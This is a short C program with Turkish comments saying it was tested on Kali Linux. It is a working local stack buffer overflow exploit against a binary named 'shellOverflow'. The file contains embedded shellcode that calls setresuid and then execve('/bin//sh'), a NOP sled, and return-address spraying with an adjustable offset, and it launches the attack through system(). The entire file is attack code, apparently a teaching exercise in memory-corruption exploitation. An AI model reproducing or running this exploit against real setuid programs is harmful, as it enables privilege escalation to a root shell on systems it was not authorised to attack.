/*
//Kali Linux Uzerinde Denenmistir.
*/


#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";
int main(int argc, char *argv[]) {
 unsigned int i, *ptr, ret, offset=270;
 char *command, *buffer;
 command = (char *) malloc(200);
 bzero(command, 200); // https://man7.org/linux/man-pages/man3/bzero.3.html detayli aciklama sayfada.
 strcpy(command, "./shellOverflow \'"); // Buffer Baslar
 buffer = command + strlen(command); // Buffer sonda isleme al.
 if(argc > 1) // Offset Ayarla.
 offset = atoi(argv[1]);
 ret = (unsigned int) &i - offset; // geridonus Adresini isleme al.
 for(i=0; i < 160; i+=4) // Buffer donen adres ile doldur.
 *((unsigned int *)(buffer+i)) = ret;
 memset(buffer, 0x90, 60); // NOP rampası derle.
 memcpy(buffer+60, shellcode, sizeof(shellcode)-1);
 strcat(command, "\'");
 system(command); // Exploit Calistir.
}